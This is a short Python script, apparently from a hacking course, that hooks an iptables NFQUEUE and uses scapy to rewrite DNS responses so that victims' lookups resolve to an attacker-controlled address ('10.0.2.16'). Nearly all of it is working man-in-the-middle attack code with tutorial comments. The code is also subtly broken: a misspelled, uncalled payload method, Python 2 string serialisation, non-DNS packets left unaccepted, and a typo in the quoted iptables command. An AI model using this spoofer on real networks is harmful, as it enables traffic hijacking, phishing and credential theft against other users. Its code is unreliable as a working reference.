#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy


# @ Requires a captured packet
# @ ensures sent the modified packet
# @ raises nothing
def process_packet(packet):
    # scapy convert the package into a scapy packet and we will able to interact with it
    # get_payloads adds the content of the packets on the screen
    scapy_packet = scapy.IP(packet.get_payloads)
    if scapy_packet.haslayer(scapy.DNSRR):
        # qname give www.bing.com
        # DNSQR layer name
        qname = scapy_packet[scapy.DNSQR].qname
        print("[+] Spoofing target")
        # create a dns response
        # rdata is for the ip of the hacking server
        answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.16")
        print(scapy_packet.show())
        # an is the answers parts / modify the answer
        scapy_packet[scapy.DNS].an = answer
        # modify the number of answer from 4 to 1
        scapy_packet[scapy.DNS].ancount = 1

        # len = lenght of the layer
        # checksum is used to make sure that the packet has not been modified
        # we will remove them to not corrupt our packet
        del scapy_packet[scapy.IP].len
        del scapy_packet[scapy.IP].chksum
        del scapy_packet[scapy.UDP].chksum
        del scapy_packet[scapy.UDP].len

        # we set the modification of the packet
        packet.set_payload(str(scapy_packet))
        # we accept the packet modify
        packet.accept()  # forward the packet to the destination
        # trap the packet # packet.drop()


# create an instance of a net filter queue objet
queue = netfilterqueue.NetfilterQueue()
# connect this object with the queue that we create (iptables -I FORWARD -j NFQUEUE --gueue-num 0)
# 0 because we used number 0 for the queue
# with a callback function to execute on each packet that will be trapped in this queue right
queue.bind(0, process_packet)
# run the queue
queue.run()
